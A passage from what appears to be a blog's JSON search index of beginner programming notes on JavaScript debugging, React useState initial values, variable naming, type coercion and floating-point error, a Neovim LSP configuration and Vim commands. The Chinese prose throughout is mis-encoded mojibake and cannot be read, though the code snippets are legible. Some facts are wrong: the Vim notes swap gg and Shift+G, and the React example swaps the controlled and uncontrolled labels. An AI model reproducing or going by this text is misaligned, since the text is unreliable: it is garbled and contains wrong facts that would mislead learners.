else { console.log('else', num, i) return true } }}console.log(isPrime(25)) // true è¼¸å‡ºçµæœï¼š 1234num: 25i: 2else 25 2true é€™æ™‚å€™å•é¡Œå°±ä¸€ç›®äº†ç„¶äº†ã€‚ ç•¶ 25 é€²å…¥è¿´åœˆä¸­çš„æ¢ä»¶åˆ¤æ–· num % i === 0 æ™‚æ²’é€šéï¼Œæ‰€ä»¥é€²åˆ° else å€å¡Šï¼Œé€™å€‹æ™‚å€™å°±ç›´æ¥ return trueï¼Œ25 è¢«è¦–ç‚ºè³ªæ•¸ã€‚ ä½†é‡é»ä¾†äº†ï¼Œè³ªæ•¸çš„å®šç¾©æ˜¯ã€Œæ¯”è‡ªå·±å°çš„æ‰€æœ‰æ•¸å­—éƒ½ç„¡æ³•æ•´é™¤ã€ã€‚æ‰€ä»¥å³ä¾¿ 25 ä¸èƒ½è¢« 2 æ•´é™¤ï¼Œä¹Ÿä¸ä»£è¡¨å®ƒå°±æ˜¯è³ªæ•¸ï¼Œå› ç‚ºé‚„æœ‰ 3, 4, 5, â€¦ 24 å¯ä»¥æ¸¬è©¦ã€‚ æ‰€ä»¥é€™å€‹ç¯„ä¾‹çš„å•é¡Œåœ¨æ–¼ï¹”ã€Œelse æ‡‰è©²å¯«åœ¨è¿´åœˆçš„å¤–é¢ã€ï¼Œæ‰èƒ½å¾—åˆ°æ­£ç¢ºçš„çµæœã€‚ æ¡ˆä¾‹äºŒé€™æ˜¯æˆ‘æ›¾ç¶“è‡ªå·±æŠŠ += å¯«æˆ = ç”¢ç”Ÿçš„ bugã€‚ æ­£ç¢ºçš„çµæœæ‡‰è©²è¦æ˜¯ã€Œè½‰æˆå°å¯«çš„å­—ä¸²ã€ï¼š 12345678910const str = 'AbCdEFGhijkLMN'var result = ''for(var i=0; i&lt;str.length; i++) { if(str[i] &gt;= 'A' &amp;&amp; str[i] &lt;= 'Z') { result = String.fromCharCode(str[i].charCodeAt(0) + 32) } else { result = str[i] }}console.log(result) æœ€å¾Œå¾—åˆ°çš„çµæœæ˜¯ nï¼Œç‚ºä»€éº¼ï¼Ÿæˆ‘å€‘ä¾† log çœ‹çœ‹ï¼š 123456789101112131415const str = 'AbCdEFGhijkLMN'var result = ''for(var i=0; i&lt;str.length; i++) { console.log('i:', i) console.log('str:', str[i]) if(str[i] &gt;= 'A' &amp;&amp; str[i] &lt;= 'Z') { console.log('&gt;=A and &lt;=Z:', str[i]) result += String.fromCharCode(str[i].charCodeAt(0) + 32) console.log('result:', result) } else { console.log('else:', str[i]) result += str[i] console.log('result:', result) }} 12345678910111213141516i: 0str: A&gt;=A and &lt;=Z: Aresult: ai: 1str: belse: bresult: b...i: 13str: N&gt;=A and &lt;=Z: Nresult: n å¾è¼¸å‡ºçµæœå°±èƒ½å¾ˆæ¸…æ¥šçš„çœ‹åˆ°å•é¡Œé»ï¼Œå› ç‚ºæ¯ä¸€åœˆ result éƒ½è¢« = çµ¦é‡æ–°è³¦å€¼ï¼Œæ‰€ä»¥åœ¨æœ€å¾Œä¸€åœˆçš„æ™‚å¾Œ result è¢«è³¦å€¼ç‚º nï¼Œå¾—åˆ°äº†æœ€å¾Œçš„çµæœã€‚ æ‰€ä»¥æ­£ç¢ºçš„ä½œæ³•æ˜¯ç”¨ += ä¾†åšå­—ä¸²æ‹¼æ¥ï¼Œè€Œä¸æ˜¯ç”¨ = ä¾†é‡æ–°è³¦å€¼ã€‚ çµæŸï¼","link":"/2021/12/20/use-log-to-debug/"},{"title":"ä½¿ç”¨ useState è¦æ³¨æ„åˆå§‹å€¼çš„è¨­å®š","text":"ç­†è¨˜èµ·ä¾†ã€‚ ç°¡è¿°å°±ç®—æ˜¯ç©ºå­—ä¸²ä¹Ÿè¨˜å¾—è¦å‚³å€¼ï¼Œä¸å¯ä»¥ä¸å¡«ï¼š 12const [value setValue] = useState(); // éŒ¯èª¤const [value setValue] = useState(''); // æ­£ç¢º ç”¨éŒ¯èª¤çš„åšæ³• React æœƒè·Ÿä½ èªª Component å¾ Uncontrolled è®Š Controlledã€‚ é€™æ˜¯å› ç‚ºå¦‚æœæŠŠä¸€å€‹ props è¨­ç‚º undefined ï¼ŒReact å°±æœƒè¦–ç‚ºæ²’æœ‰å‚³ï¼Œç„¶å¾Œç•¶æˆ Uncontrolledã€‚ é™„è¨»ï¼šç”¨ null ä¹Ÿæœƒæœ‰ä¸€æ¨£çš„å•é¡Œï¼Œæ‰€ä»¥å»ºè­°ä¸€å¾‹ç”¨ç©ºå­—ä¸²ä¾†ç•¶ä½œåˆå§‹å€¼ 1234// controlled &lt;input value={undefined} /&gt;// uncontrolled&lt;input value={\"\"} /&gt; è¨˜å¾—æ³¨æ„é€™å€‹å°ç´°ç¯€ï½","link":"/2022/04/12/use-state-init-value-problem/"},{"title":"è®Šæ•¸çš„å‘½åå“²å­¸","text":"ä¸éå°±ä¸€å€‹è®Šæ•¸é‚„èƒ½æ‰¯å“²å­¸ï¼Ÿ èªæ„åœ¨å¹«ä¸€å€‹è®Šæ•¸å‘½åçš„æ™‚å€™ï¼Œæ¯”è¼ƒå¸¸è¦‹çš„åšæ³•æ˜¯ç”¨ã€Œèªæ„ã€ä¾†å¹«å–åã€‚ä¹Ÿå°±æ˜¯èªªé€™å€‹è®Šæ•¸ä»£è¡¨çš„æ„æ€æ˜¯ä»€éº¼ã€‚ ä¾‹å¦‚èªªæˆ‘æœƒæŠŠä¸€å€‹è·Ÿå­—ä¸²æœ‰é—œçš„è®Šæ•¸å‘½åç‚º str = 'string'ï¼Œæ•¸å­—æœ‰é—œçš„å‘½åç‚º num = 123ï¼Œä¸€å€‹å¾ˆç›´è¦ºä¹Ÿå¾ˆåˆç†çš„å‘½åæ–¹å¼ã€‚å¯æ˜¯å¦‚æœæ˜¯ str = 3ï¼Œæˆ–æ˜¯ num = 'cool çš„è©±ï¼Œå°±éå¸¸ä¸åˆç†ã€‚ æ‰€ä»¥ä¸€å€‹è®Šæ•¸çš„ã€Œèªæ„ã€å¾ˆé‡è¦ã€‚å¦‚æœä½ æƒ³æ‰¾çš„æ˜¯æœ€å¤§å€¼ï¼Œå°±ä¹¾è„†ä¸€é»å« max æˆ–æ˜¯ maxNumberã€maxValue ä¹‹é¡çš„éƒ½è¡Œï¼Œæœƒæ¯” num æˆ–æ˜¯ value å¥½ï¼Œå› ç‚ºæ›´æ˜ç¢ºä¸€é»ã€‚ èªæ³•å…¶å¯¦åªæ˜¯æƒ³ç´€éŒ„ä¸€ä¸‹æœ‰å“ªå¹¾ç¨®è¦å‰‡ï¼Œè·Ÿé †ä¾¿å­¸é»å–®å­—ï¼š maxNumber (camel case)ï¼Œå°å¯«é–‹é ­ï¼Œå–®å­—é€£æ¥çš„éƒ¨åˆ†è®Šæˆå¤§å°ã€‚å› ç‚ºå¾ˆåƒé§±é§çš„èƒŒï¼Œæ‰€ä»¥è¢«ç¨±ç‚ºé§å³°å¼ MaxNumber (pascal case)ï¼Œå¤§å¯«é–‹é ­çš„é§å³°å¼ max_value (snake case)ï¼Œç”¨åº•ç·šéš”é–‹å–®å­—ï¼Œåº•ç·šåƒè›‡æ‰€ä»¥æ‰å« snake max-value (kebab case)ï¼Œç”¨ - éš”é–‹å–®å­—ï¼Œkebab æ˜¯çƒ¤è‚‰ä¸²çš„æ„æ€ï¼ˆå› ç‚ºé€™ç¨®å¯«æ³•å¾ˆåƒä¸²ç‡’ï¼‰ ä¸ç®¡ä½ æ˜¯ç”¨å“ªä¸€ç¨®ï¼Œè«‹è¨˜å¾—è²«å¾¹å§‹çµ‚ï¼Œä¸è¦ä¸€ä¸‹ myHoueseï¼Œ ä¸€ä¸‹åˆ MyHouseï¼Œé€™æ¨£æ˜¯æœ€ç³Ÿç³•çš„ä½œæ³•ã€‚ åœ¨ JavaScript ä¸­æœ€å¤šä¹Ÿæœ€å¸¸è¦‹çš„èªæ³•æ˜¯ã€Œé§å³°å¼å‘½åã€ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šå°±æŒ‰ç…§é€™å€‹èªæ³•ä¾†å¯«å°±å¥½ã€‚ å¦å¤–ï¼Œå¤§å¯«é–‹é ­çš„é§å³°å¼é€šå¸¸æ˜¯ç”¨åœ¨ Class æ‰æœƒç”¨åˆ°ï¼Œæ‰€ä»¥æ²’äº‹çš„è©±ç›¡é‡ä¸è¦äº‚ç”¨ï¼Œä»¥å…æ··æ·†ã€‚","link":"/2021/12/21/variable-naming/"},{"title":"è®Šæ•¸é‹ç®—æ™‚è©²æ³¨æ„çš„å¹¾ä»¶äº‹","text":"åŸºæœ¬ä½†å»é‡è¦ã€‚ è¦æ³¨æ„è³‡æ–™å‹åˆ¥ä¸€å€‹å¾ˆå¸¸è¦‹çš„ä¾‹å­æ˜¯ã€Œå­—ä¸² + æ•¸å­—ã€ï¼š 12var a = 100console.log(a + '10') // '10010' ç•¶ã€Œå­—ä¸² + ä»»ä½•æ±è¥¿æ™‚ã€ï¼Œéƒ½æœƒè¢«å¼·åˆ¶è½‰æˆå­—ä¸²åšã€Œå­—ä¸²æ‹¼æ¥ã€ã€‚ ç‚ºäº†é¿å…é€™ç¨®æƒ…æ³ï¼Œç•¶ä½ æƒ³åšçš„æ˜¯æ•¸å­¸é‹ç®—æ™‚ï¼Œè«‹å‹™å¿…å…ˆè½‰æ›å‹æ…‹ï¼š Number(a) parseInt(a, 10)ï¼Œç¬¬äºŒå€‹åƒæ•¸æ˜¯ä»£è¡¨ a é€™å€‹å­—ä¸²ä»£è¡¨çš„æ˜¯å¹¾é€²ä½çš„æ•¸å­— æ‰€ä»¥å‰›å‰›çš„æŠŠä¾‹å­ä¿®æ­£ä¸€ä¸‹ï¼š 123var a = 100console.log(a + Number('10')) // 110console.log(a + parseInt('10', 10)) // 110 è¦æ³¨æ„æµ®é»æ•¸èª¤å·®é€™å€‹é‚„è »å¸¸å¿½ç•¥æ‰çš„ï¼Œä½†æµ®é»æ•¸å¾ˆå¤šæ™‚å€™è·Ÿä½ æƒ³çš„ä¸ä¸€æ¨£ï¼š 123var a = 0.1 + 0.2console.log(a === 0.3) //falseconsole.log(a) // 0.30000000000000004 ä¸è¦æ‡·ç–‘äººç”Ÿï¼ŒçœŸçš„ä¸ä¸€æ¨£ã€‚ ä½†ç°¡å–®ä¾†èªªï¼Œæµ®é»æ•¸æœƒæœ‰ã€Œè¼¸å…¥å€¼ä¸ç²¾ç¢ºã€è·Ÿã€Œæº¢ä½ã€çš„å•é¡Œï¼Œéå¿…è¦æ™‚ç›¡é‡ä¸è¦ç”¨æµ®é»æ•¸ã€‚ è£œå……ï¼šã€Œæº¢ä½ã€æŒ‡çš„å°±æ˜¯è¶…å‡ºè¨˜æ†¶é«”å¯ä»¥å„²å­˜çš„ä½å…ƒæ•¸ã€‚","link":"/2021/12/17/variable-problem/"},{"title":"Vimï¼LSP ç­†è¨˜","text":"å…¶å¯¦æˆ‘å€‘æ¯å¤©éƒ½åœ¨ç”¨å®ƒï¼Œåªæ˜¯æˆ‘å€‘è‡ªå·±ä¸çŸ¥é“ã€‚ ä»€éº¼æ˜¯ LSPï¼Ÿä¸€å€‹å”è­°ï¼ˆProtocalï¼‰ï¼ŒæŠŠç¨‹å¼ç·¨è¼¯å™¨åˆ†ç‚º Sever è·Ÿ Client å…©å€‹éƒ¨åˆ†ï¼š å°±è·Ÿç¶²é é–‹ç™¼ä¸­çš„å‰å¾Œç«¯ä¸€æ¨£ï¼Œå¾Œç«¯æ‰æ˜¯é‚£å€‹çœŸæ­£å¹«ä½ æª¢æŸ¥èªæ³•æˆ–æ ¼å¼æ˜¯å¦æ­£ç¢ºçš„äººï¼Œè€Œå‰ç«¯å‰‡æ˜¯è² è²¬å¹«è™•ç†ä½ çœ¼å‰ç•«é¢çš„é‚£å€‹äººã€‚ Neovim å…§å»ºå°±æœ‰åŒ…å« client ç«¯çš„éƒ¨åˆ†ï¼Œå¯ä»¥è®“ä½ ç”¨ä¸€äº› LSP ç›¸é—œçš„ API ä¾†é¡¯ç¤ºèªæ³•éŒ¯èª¤ã€é«˜äº®é†’ç›®ç­‰ç­‰çš„åŠŸèƒ½ã€‚ è‡³æ–¼ server çš„éƒ¨åˆ†å‰‡éœ€è¦è‡ªå·±å®‰è£ï¼Œä»¥å‰ç«¯ä¾†èªªçš„è©±æœƒç”¨ npm install -g typescript-language-server ä¾†è™•ç†ã€‚ä¸éå¤šè™§æœ‰äººå¯«äº† nvim-lsp-installer ï¼Œæ‰€ä»¥å¯ä»¥çœä¸‹è‡ªå·±å®‰è£çš„åŠŸå¤«ã€‚ æ¨è–¦ç¶²ç«™ lsp-server_configurations å¯¦éš›é…ç½®1. å®‰è£å¿…è¦å¥—ä»¶ 12use \"neovim/nvim-lspconfig\"use \"williamboman/nvim-lsp-installer\" 2. ç”¨ lsp-installer å®‰è£æƒ³è¦çš„ language server 1:LspInstallInfo 3. å¯«é…ç½®æª”ï¼ˆsetupï¼‰ é€™é‚Šå…ˆèªªå€‹æ¦‚å¿µï¼Œç†è«–ä¸Šæ¯ä¸€å€‹èªè¨€éƒ½æœƒæœ‰ä¸åŒçš„ setupï¼Œæ‰€ä»¥å¦‚æœä½ æƒ³æŠŠæª”æ¡ˆçµæ§‹æ‹†çš„æ¯”è¼ƒç´°çš„è©±ï¼Œå°±æœƒæœ‰è »å¤šæª”æ¡ˆçš„ã€‚å› æ­¤é€™é‚Šç‚ºäº†æ–¹ä¾¿ç†è§£å…ˆå…¨éƒ¨å¯«æˆåœ¨ä¸€å€‹æª”æ¡ˆè£¡ï¼š 12345678910111213141516171819-- lua/user/setup-- å¼•å…¥å¥—ä»¶local lsp_installer = require \"nvim-lsp-installer\"local lsp_config = require \"lspconfig\"-- é€™å€‹çœ‹èµ·ä¾†æ˜¯ç”¨ä¾†è¨­å®š installer æœ¬èº«çš„ configï¼Œä½†å…¶å¯¦æ˜¯å¿…è¦çš„ä¸€è¡Œï¼Œä¸å¯ä»¥æ‹¿æ‰ã€‚require(\"nvim-lsp-installer\").setup({ automatic_installation = true, -- è‡ªå‹•å®‰è£ï¼ˆéœ€é‡æ–°é‡å•Ÿ neovimï¼‰ ui = { icons = { server_installed = \"âœ“\", server_pending = \"âœ\", server_uninstalled = \"âœ—\" } }})-- ä¸€å®šè¦æœ‰é€™ä¸€è¡Œ setup ä½ çš„ language server æ‰æœƒå•Ÿå‹•lsp_config.sumneko_lua.setup{} é™„è¨»ï¼šå…¶å¯¦ lspconfig ä¸»è¦çš„ç”¨é€”å°±æ˜¯è®“ä½ å¯ä»¥ç”¨æ¯”è¼ƒç°¡å–®çš„æ–¹å¼ä¾†è™•ç† code è€Œå·²ï¼Œä»–æœ¬èº«æ˜¯æ²’æœ‰ä»»ä½• language server client çš„åŠŸèƒ½çš„ï¼Œè©³ç´°å¯ä»¥åƒè€ƒå®˜æ–¹çš„ wiki æœ€å¾Œçœ‹åˆ°æœ‰å‡ºç¾èªæ³•æª¢æŸ¥çš„æ•ˆæœå°±æˆåŠŸäº†ã€‚ é—œæ–¼ lsp_installer.on_server_ready()åœ¨ä¸€äº›èˆŠçš„è¨­å®šä¸­ä½ å¯èƒ½æœƒçœ‹åˆ°é€™æ¨£çš„å¯«æ³•ï¼š 1234567891011121314151617181920212223242526272829303132local status_ok, lsp_installer = pcall(require, \"nvim-lsp-installer\")if not status_ok then returnend-- Register a handler that will be called for all installed servers.-- Alternatively, you may also register handlers on specific server instances instead (see example below).lsp_installer.on_server_ready(function(server) local opts = { on_attach = require(\"user.lsp.handlers\").on_attach, capabilities = require(\"user.lsp.handlers\").capabilities, } if server.name == \"jsonls\" then local jsonls_opts = require(\"user.lsp.settings.jsonls\") opts = vim.tbl_deep_extend(\"force\", jsonls_opts, opts) end if server.name == \"sumneko_lua\" then local sumneko_opts = require(\"user.lsp.settings.sumneko_lua\") opts = vim.tbl_deep_extend(\"force\", sumneko_opts, opts) end if server.name == \"pyright\" then local pyright_opts = require(\"user.lsp.settings.pyright\") opts = vim.tbl_deep_extend(\"force\", pyright_opts, opts) end -- This setup() function is exactly the same as lspconfig's setup function. -- Refer to https://github.com/neovim/nvim-lspconfig/blob/master/doc/server_configurations.md server:setup(opts)end) å®˜æ–¹ç¾åœ¨å·²ç¶“ä¸å»ºè­°é€™æ¨£å¯«äº†ï¼Œå¯ä»¥åˆ°é€™å€‹ issue ä¸­åƒè€ƒè©³ç´°å…§å®¹ã€‚ ç¾åœ¨å»ºè­°çš„å¯«æ³•ï¼š 1234567-- ç•¶ä½œé€™è¡Œä¸å­˜åœ¨ï¼ˆé™¤éä½ æƒ³è¨­ç½®å…¶ä»– configï¼‰require(\"nvim-lsp-installer\").setup {}local lspconfig = require(\"lspconfig\")lspconfig.sumneko_lua.setup {}lspconfig.tsserver.setup {}-- ... and so on æŸ¥çœ‹ LSP é€£çµç‹€æ…‹ç•¶ä½ æƒ³å¯«ä¸€äº›é…ç½®çš„æ™‚å€™ä½ å¯èƒ½æœƒéœ€è¦çŸ¥é“ clientï¼ˆä¸€å€‹ tableï¼‰ç›¸é—œçš„è³‡è¨Šï¼Œé€™æ™‚å€™å¯ä»¥ç”¨ :lua print(vim.inspect(vim.lsp.buf_get_clients())) ä¾†æŸ¥çœ‹ï¼ˆé€™å€‹å¾ˆæœ‰ç”¨ï¼‰ã€‚ æˆ‘çš„ LSP config å¿«æ·éµé…ç½®12345678910111213141516171819202122local function lsp_keymaps(bufnr) local opts = { noremap = true, silent = true, buffer = bufnr } -- popup diagnostic vim.keymap.set('n', 'gl', vim.diagnostic.open_float, opts) -- è·³åˆ°ä¸‹ä¸€å€‹ diagnostic vim.keymap.set('n', '[d', vim.diagnostic.goto_prev, opts) -- è·³åˆ°å‰ä¸€å€‹ diagnostic vim.keymap.set('n', ']d', vim.diagnostic.goto_next, opts) -- é¡¯ç¤º diagnostic åˆ—è¡¨ vim.keymap.set('n', '&lt;space&gt;q', vim.diagnostic.setloclist, opts) vim.keymap.set('n', 'gD', vim.lsp.buf.declaration, opts) vim.keymap.set('n', 'gd', vim.lsp.buf.definition, opts) vim.keymap.set('n', 'gr', vim.lsp.buf.references, opts) vim.keymap.set('n', 'gi', vim.lsp.buf.implementation, opts) -- åˆ°é‚£å€‹ type å®šç¾©çš„åœ°æ–¹ vim.keymap.set('n', 'gt', vim.lsp.buf.type_definition, opts) vim.keymap.set('n', 'D', vim.lsp.buf.hover, opts) vim.keymap.set('n', '&lt;C-s&gt;', vim.lsp.buf.signature_help, opts) vim.keymap.set('n', '&lt;F2&gt;', vim.lsp.buf.rename, opts) -- å°é€™å€‹ diagnostic åšäº‹æƒ…ï¼ˆä¾‹å¦‚ï¼šdisable lineï¼‰ vim.keymap.set('n', '&lt;leader&gt;ca', vim.lsp.buf.code_action, opts)end","link":"/2022/10/19/vim-lsp-note/"},{"title":"Vim ç­†è¨˜","text":"å‚³èªªä¸­çš„ vimã€‚ Vim çš„ä¸‰ç¨®æ¨¡å¼åŸºæœ¬ä¸Š Vim æœƒæœ‰ä¸‰ç¨®æ¨¡å¼ï¼Œåˆ†åˆ¥æ˜¯ï¼š æ™®é€šæ¨¡å¼ï¼ˆNormal Modeï¼‰ æ’å…¥æ¨¡å¼ï¼ˆInsert Modeï¼‰ é¸å–æ¨¡å¼ï¼ˆVisual Modeï¼‰ åœ¨ä¸€é–‹å§‹é€²å…¥ vim çš„æ™‚å¾Œé è¨­æœƒæ˜¯æ™®é€šæ¨¡å¼ï¼Œåœ¨é€™å€‹æ¨¡å¼ä¸­æ¯ä¸€å€‹éµæœƒæœ‰ä¸åŒçš„åŠŸèƒ½ï¼Œåƒæ˜¯ d å¯ä»¥ç”¨ä¾†åˆªé™¤ä¸€æ’æ–‡å­—ï¼Œaã€oã€ i å¯ä»¥ç”¨ä¾†é€²å…¥æ’å…¥æ¨¡å¼ç­‰ç­‰ã€‚ é™¤æ­¤ä¹‹å¤–åœ¨æ™®é€šæ¨¡å¼ä¸­å¯ä»¥ç”¨ : ä¾†ä¸‹æŒ‡ä»¤ï¼Œæ‰€ä»¥æœ€ç°¡å–®çš„ä¾‹å­å°±æ˜¯åœ¨æ™®é€šæ¨¡å¼ä¸­ç”¨ :q ä¸‹ä¸€å€‹ã€Œæˆ‘è¦é›¢é–‹ã€çš„æŒ‡ä»¤ï¼Œvim æ¥æ”¶åˆ°æŒ‡ä»¤å¾Œæ‰æœƒå¸¶ä½ é›¢é–‹ã€‚ è‡³æ–¼æ’å…¥æ¨¡å¼å°±æ˜¯ç´”ç²¹çš„è®“ä½ ã€Œè¼¸å…¥ä»»ä½•æ–‡å­—ã€ï¼Œæ¯ä¸€å€‹éµå°±æ˜¯å–®ç´”ä»£è¡¨æŸä¸€å€‹å­—ï¼Œä¸åƒæ™®é€šæ¨¡å¼ä¸€æ¨£æœƒå…·æœ‰ç‰¹å®šçš„åŠŸèƒ½ã€‚ é †é“ä¸€æï¼Œè¦å¾æ’å…¥æ¨¡å¼å›åˆ°æ™®é€šæ¨¡å¼çš„æ–¹å¼å¾ˆç°¡å–®ï¼šåªè¦æŒ‰ä¸‹ ESC æˆ– Ctrl + [ å°±è¡Œäº† æœ€å¾Œæ˜¯æ’å…¥æ¨¡å¼ï¼Œé€™å€‹èªªç©¿äº†å°±åªæ˜¯è®“ä½ å¯ä»¥åƒæ»‘é¼ ä¸€æ¨£åšã€Œé¸å–ã€çš„å‹•ä½œè€Œå·²ã€‚ å…¶å¯¦å¯ä»¥æ’åˆ°ä½ æƒ³æ’çš„åœ°æ–¹å‰é¢æœ‰æåˆ° aã€iã€o é€™ä¸‰å€‹éµéƒ½èƒ½ç”¨ä¾†é€²å…¥æ’å…¥æ¨¡å¼ï¼Œä½†é€™å…¶å¯¦é€™ä¸æ˜¯ä»€éº¼ç‚ºäº†é˜²å‘†ä¾†é…ç½®çš„å„ç¨®å¿«æ·éµï¼Œè€Œæ˜¯ä»–å€‘æ’å…¥çš„æ–¹å¼ä¸å¤ªä¸€æ¨£ã€‚ å‡è¨­é€™æ˜¯ç›®å‰çš„ç‹€æ…‹ï¼ˆæ³¨æ„æ¸¸æ¨™çš„ä½ç½®åœ¨ 5ï¼‰ï¼š æ¥ä¸‹ä¾†å¦‚æœæˆ‘æŒ‰ä¸‹ï¼š i ï¼Œvim å°±æœƒè‡ªå‹•å¹«æˆ‘æŠŠæ¸¸æ¨™æ’å…¥åˆ° 5 çš„å‰é¢ aï¼Œvim å°±æœƒè‡ªå‹•å¹«æˆ‘æŠŠæ¸¸æ¨™æ’å…¥åˆ° 5 çš„å¾Œé¢ oï¼Œvim å°±æœƒè‡ªå‹•å¹«æˆ‘æŠŠæ¸¸æ¨™æ’åˆ°ä¸‹ä¸€è¡Œçš„ä½ç½® ï¼ˆæˆ‘åœ¨é€²å…¥å¾Œè¼¸å…¥çš„æ–‡å­—æ˜¯è¡¨ç¤ºç›®å‰æ˜¯ç”¨å“ªå€‹éµä¾†é€²å…¥çš„ï¼Œä½ åªè¦æ³¨æ„æˆ‘è¼¸å…¥å¾Œå‡ºç¾çš„ä½ç½®åœ¨å“ªå°±å¥½ï¼Œé€™å€‹å°±æ˜¯ä¸Šé¢çš„æ„æ€ï¼‰ æ­¤å¤– Aã€Iã€O ï¼ˆå¯ä»¥æ­é… shiftï¼‰ä¹Ÿå¯ä»¥ç”¨ä¾†é€²å…¥æ’å…¥æ¨¡å¼ï¼Œä¸éåˆæœƒæ˜¯å¦å¤–ä¸€ç¨®æ’å…¥çš„æ–¹å¼ï¼Œä½†æ¦‚å¿µä¸Šéƒ½è·Ÿå‰é¢å·®ä¸å¤šã€‚ é›¢é–‹ Vim çš„æ–¹æ³•åœ¨ä½ é‚„æ²’æœ‰è¼¸å…¥ä»»ä½•æ±è¥¿ä»¥å‰ï¼Œå¯ä»¥ç”¨ :q ä¾†é›¢é–‹ã€‚ å¯æ˜¯ä¸€æ—¦ä½ é€²å…¥ã€ŒInsert æ¨¡å¼ã€ä¸¦æ‰“äº†ä»»ä½•ä¸€å€‹å­—ï¼Œä½ å°±å¾—ç”¨ :q! ä¾†å‘Šè¨´ Vim ä½ ä¸æƒ³ä¿ç•™ä»»ä½•ä¿®æ”¹ï¼Œè®“æˆ‘é›¢é–‹å°±å°äº†ã€‚ å¦å‰‡æœƒå‡ºç¾é€™å€‹è­¦å‘Šï¼š 1E37: No write since last change (add ! to override) éƒ½èªªäº†æ˜¯ :q! ä¸æ˜¯ :!qåœ¨å°é€™äº›æŒ‡ä»¤ä¸ç†Ÿçš„æ™‚å€™å¸¸å¸¸æœƒæŠŠæŒ‡ä»¤çµ¦è¨˜éŒ¯ï¼Œåƒæˆ‘å°±å¾ˆå¸¸æŠŠ :q! æ‰“æˆ :!qï¼Œçµæœå°±æœƒè·³åˆ°é€™å€‹å¥‡æ€ªçš„ç•«é¢ï¼š å¾Œä¾†ç™¼ç¾å…¶å¯¦ :! çš„ç”¨é€”å…¶å¯¦æ˜¯ã€Œæˆ‘è¦åŸ·è¡Œ Terminal ç›¸é—œçš„æŒ‡ä»¤ã€ï¼Œæ‰€ä»¥ç•¶ä½ åŸ·è¡Œ :!q çš„æ™‚å€™å°±ç­‰åŒæ–¼ç›´æ¥åœ¨ Terminal ä¸ŠåŸ·è¡Œ q é€™å€‹æŒ‡ä»¤çš„æ„æ€ï¼Œæ‰€ä»¥ä¸Šé¢æ‰æœƒè·³ä¸€æ®µï¼š 1zsh:1: command not found: q å°±æ˜¯åœ¨è·Ÿä½ èªªã€Œæ²’æœ‰ q é€™å€‹æŒ‡ä»¤å“¦ã€çš„æ„æ€ã€‚ æ‰€ä»¥ :q! è·Ÿ :!q é›–ç„¶é•·å¾—å¾ˆé¡ä¼¼ï¼Œä½†å¯¦éš›ç”¨é€”å»æ˜¯å¤©å·®åœ°é ï¼Œé€™ä¸€é»è¦ç‰¹åˆ¥è¨˜ä½ã€‚ ç·¨è¼¯å™¨ç›¸é—œçš„è¨­å®š :set number é¡¯ç¤ºè¡Œæ•¸ï¼ˆçµ•å°ä½ç½®ï¼‰ :set relativenumber é¡¯ç¤ºè¡Œæ•¸ï¼ˆç›¸å°ä½ç½®ï¼‰ :set mouser=a é–‹å•Ÿæ»‘é¼ åŠŸèƒ½ï¼ˆé»æ“Šã€é¸å–ï¼‰ set tabstop=2 tab çš„å¯¬åº¦ set shiftwidth=2 ç¸®æ’çš„å¯¬åº¦ï¼ˆé€šå¸¸æœƒè·Ÿ tabstop ä¸€æ¨£ï¼‰ colorscheme default ä¸»é¡Œè‰² syntax on èªæ³•é«˜äº® set expandtab æŠŠ tab æ›¿æ›æˆç©ºç™½éµ å¦‚æœè¦å¥—ç”¨ç‚ºå…¨åŸŸè¨­å®šçš„è©±å¯ä»¥åœ¨ ~/.vimrc ä¸­å»ºç«‹æª”æ¡ˆï¼Œä¸¦å¡«å…¥å…§å®¹ï¼š 123456789set numberset relativenumberset tabstop=2set shiftwidth=2set autoindentset mouse=acolorscheme defaultsyntax onset expandtab æ™®é€šæ¨¡å¼ä¸­çš„ç›¸é—œçš„ç†±éµ d åˆªé™¤ D åˆªé™¤æ¸¸æ¨™å¾Œå‰©ä¸‹çš„æ–‡å­— y è¤‡è£½ï¼ˆyankingï¼‰ p è²¼ä¸Šï¼ˆpasteï¼‰ u å–æ¶ˆå‹•ä½œï¼ˆUndoï¼‰ r æ›¿æ›å–®å€‹æ–‡å­—ï¼ˆreplaceï¼‰ w è·³åˆ°ä¸‹å€‹å–®å­—ï¼ˆwordï¼‰ w è·³åˆ°ä¸‹å€‹å–®å­—ï¼ˆä¾æ“šç©ºæ ¼ä¾†è·³ï¼‰ b è·³åˆ°å‰ä¸€å€‹å–®å­—ï¼ˆback wordï¼‰ B è·³åˆ°å‰ä¸€å€‹å–®å­—ï¼ˆä¾æ“šç©ºæ ¼ä¾†è·³ï¼‰ e è·³åˆ°å–®å­—çš„æœ€å°¾ç«¯ï¼ˆend of wordï¼‰ $ è·³åˆ°è¡Œå…§çš„çµ‚é»ï¼ˆå¯ä»¥æƒ³æˆæ­£å‰‡è¡¨é”çš„ $ï¼‰ g_ è·³åˆ°è¡Œå…§çš„çµ‚é»ï¼ˆå¯ä»¥æƒ³æˆæ­£å‰‡è¡¨é”çš„ $ï¼‰ 0 è·³åˆ°è¡Œå…§çš„èµ·å§‹é»ï¼ˆæœƒå›åˆ°é‚£ä¸€è¡Œçš„æœ€èµ·é»ï¼Œç„¡è¦–ç¸®æ’ï¼‰ ^ è·³åˆ°è¡Œå…§çš„èµ·å§‹é»ï¼ˆè·Ÿ Home éµä¸€æ¨£çš„ä½ç½®ï¼‰ _ è·³åˆ°è¡Œå…§çš„èµ·å§‹é»ï¼ˆè·Ÿ Home éµä¸€æ¨£çš„ä½ç½®ï¼‰ % è·³åˆ°æˆå°ç¬¦è™Ÿèµ·å§‹ or çµ‚é»ï¼ˆä¾‹å¦‚ {ï¼‰ t* è·³åˆ° * çš„å‰ä¸€æ ¼ï¼ˆuntilï¼‰ f* è·³åˆ° * çš„ä½ç½®ï¼ˆfindï¼‰ dd åˆªé™¤æ•´è¡Œ yy è¤‡è£½æ•´è¡Œ cc åªæ¸…é™¤ä½†ä¸åˆªé™¤è¡Œæ•¸ï¼Œä¸¦é–‹å•Ÿæ’å…¥æ¨¡å¼ï¼ˆchangeï¼‰ gg è·³åˆ°æª”æ¡ˆçš„æœ€å¾Œä¸€è¡Œï¼ˆgood gameï¼‰ zz è‡ªå‹•èšç„¦åˆ°ç•«é¢ä¸­å¤®ï¼ˆæ ¹æ“šæ¸¸æ¨™ä½ç½®ï¼‰ ctrl + r redo- shift + g è·³åˆ°æª”æ¡ˆçš„ç¬¬ä¸€è¡Œï¼ˆshit gameï¼‰ shift + v ä¸€æ¬¡é¸å–ä¸€è¡Œ ctrl + v 